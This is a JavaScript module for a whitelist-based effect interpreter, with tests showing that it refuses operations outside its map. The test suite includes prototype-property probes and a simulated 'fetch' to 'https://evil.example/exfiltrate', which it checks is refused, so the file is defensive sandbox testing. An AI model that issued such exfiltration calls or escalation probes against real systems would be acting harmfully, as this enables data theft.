/**
 * `interpret` — the restricted effect interpreter (EXEC-01). It translates a
 * guest `Effect` into its value by dispatching through `map`, refusing (as a
 * `Result`, never a throw — locked decision, see 03-CONTEXT.md) anything
 * `map` does not itself own. EXEC-02 (the own-property dispatch guard) is
 * delivered upstream in fjs 0.41.0's `match`/`at` and is not reimplemented
 * here — this module only catches `match`'s bare-string refusal throw and
 * reports it with the permitted set. The module imports only
 * `functionalscript/fjs/effects/module.f.js`,
 * `functionalscript/fjs/types/result/module.f.js`, and
 * `functionalscript/fjs/asserts/module.f.js` (no CAS, no Evo, no MCP, no
 * filesystem).
 *
 * @module
 */
import { match, do_ } from 'functionalscript/fjs/effects/module.f.js'
import { ok, error } from 'functionalscript/fjs/types/result/module.f.js'
import { assert, assertEq } from 'functionalscript/fjs/asserts/module.f.js'

/** @import { Effect, Operation, OperationMap, Return } from 'functionalscript/fjs/effects/module.f.js' */
/** @import { Result } from 'functionalscript/fjs/types/result/module.f.js' */

// ── Test fixtures ───────────────────────────────────────────────────────────────

/** @typedef {readonly ['casRead', (a: string) => string]} CasRead */
/** @typedef {readonly ['evoList', (a: string) => string]} EvoList */
/** @typedef {readonly ['evoHead', (a: string) => string]} EvoHead */
/** @typedef {readonly ['evoRevision', (a: string) => string]} EvoRevision */
/** @typedef {CasRead | EvoList | EvoHead | EvoRevision} TestOp */

/**
 * The proof's whitelist: exactly `casRead`, `evoList`, `evoHead`,
 * `evoRevision`, in this declaration order — `Object.keys` reports insertion
 * order, and that order is what a refusal message's permitted list reads as.
 * The null prototype below is cheap defence in depth (03-CONTEXT.md); it is
 * not the security mechanism — `match`'s own-property-only `at` lookup is
 * (EXEC-02, delivered upstream, not reimplemented here).
 * @type {OperationMap<TestOp, string>}
 */
const map = {
    casRead: a => `casRead:${a}`,
    evoList: a => `evoList:${a}`,
    evoHead: a => `evoHead:${a}`,
    evoRevision: a => `evoRevision:${a}`,
}
Object.setPrototypeOf(map, null)

/**
 * Simulates a stored/generated program whose command string bypassed `tsc` —
 * a real `CasOp`-typed program cannot construct these (see EXEC-07, Phase
 * 6) — but `interpret`'s runtime refusal is the backstop for exactly this
 * case. Every non-permitted-name probe below goes through `unsafeDo`; the
 * one permitted-name probe uses plain `do_`.
 * @type {(command: string) => (...payload: readonly unknown[]) => Effect<TestOp, string>}
 */
const unsafeDo = /** @type {any} */ (do_)

/**
 * `do_` narrowed to the one permitted-name probe (`dispatch`, below).
 * `do_('casRead')` alone under-constrains `O` to bare `Operation`, not
 * `CasRead` — this annotation is what pins it.
 * @type {(a: string) => Effect<CasRead, string>}
 */
const readDo = do_('casRead')

// ── interpret ────────────────────────────────────────────────────────────────

/**
 * Reports a refusal: the refused command's name plus `map`'s own permitted
 * set, in `Object.keys` insertion order (never sorted or filtered) — this is
 * the reported text an agent reads, not `match`'s raw bare-string throw.
 * @type {(command: string, map: object) => string}
 */
const refusalMessage = (command, map) => `operation not permitted: ${command}; permitted: ${Object.keys(map).join(', ')}`

/**
 * Dispatches a guest `Effect` through `map`, one command at a time.
 *
 * A `Pure` effect is already-computed per its contract — `ok(effect())`
 * forces it directly, no dispatch involved. A `Do` node goes through
 * `match(map)(effect)`: on `'cont'`, apply the continuation to the
 * operation's output and recurse into the rest of the effect; `match` never
 * returns `'done'` here, since that case is the `Pure` branch above.
 *
 * `match` refuses any command that is not an own property of `map` by
 * throwing the **bare command string** — not an `Error`, no `.message`
 * (verified against the installed fjs 0.41.0; see 03-CONTEXT.md). The
 * `catch` below reads the caught value directly, asserts it is that string
 * per `match`'s documented contract, and reports it as a `Result`, never a
 * throw — a refusal is a routine, correctable outcome here, not a crash.
 *
 * No loop, no step budget, no read-set tracking: single-command and short
 * chains dispatch or refuse correctly. Plan 02 (wave 2, same file) replaces
 * this recursive body with an iterative, budget-bounded, read-accumulating
 * version (EXEC-05/EXEC-06).
 * @template {Operation} O
 * @template T
 * @param {OperationMap<O, Return<O>>} map
 * @returns {(effect: Effect<O, T>) => Result<T, string>}
 */
export const interpret = map => effect => {
    if (typeof effect === 'function') {
        return ok(effect())
    }
    try {
        const result = match(map)(effect)
        assert(result[0] === 'cont')
        return interpret(map)(result[2](result[1]))
    } catch (thrown) {
        assert(typeof thrown === 'string')
        return error(refusalMessage(thrown, map))
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

export const proof = {
    dispatch: () => {
        const result = interpret(map)(readDo('doc-a'))
        assertEq(result[0], 'ok')
        assertEq(result[1], 'casRead:doc-a')
    },
    refusals: {
        constructor: () => {
            const result = interpret(map)(unsafeDo('constructor')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: constructor; permitted: casRead, evoList, evoHead, evoRevision')
        },
        toString: () => {
            const result = interpret(map)(unsafeDo('toString')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: toString; permitted: casRead, evoList, evoHead, evoRevision')
        },
        valueOf: () => {
            const result = interpret(map)(unsafeDo('valueOf')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: valueOf; permitted: casRead, evoList, evoHead, evoRevision')
        },
        hasOwnProperty: () => {
            const result = interpret(map)(unsafeDo('hasOwnProperty')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: hasOwnProperty; permitted: casRead, evoList, evoHead, evoRevision')
        },
        defineGetter: () => {
            const result = interpret(map)(unsafeDo('__defineGetter__')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        },
        fetch: () => {
            const result = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
        },
    },
    // EXEC-04: the two-step escalation chased to its logical end, not just a
    // single refused dispatch. Installing a getter for a denied command is
    // itself refused before the getter function ever runs, so the map gains
    // no own property from the attempt, and a following dispatch of the
    // target command is still refused with its own message.
    twoStepDefineGetterEscalation: () => {
        const install = interpret(map)(unsafeDo('__defineGetter__')('fetch', () => 'exfiltrated'))
        assertEq(install[0], 'error')
        assertEq(
            install[1],
            'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        assert(!Object.hasOwn(map, 'fetch'))
        const followUp = interpret(map)(unsafeDo('fetch')('https://evil.example/exfiltrate'))
        assertEq(followUp[0], 'error')
        assertEq(
            followUp[1],
            'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
    },
}
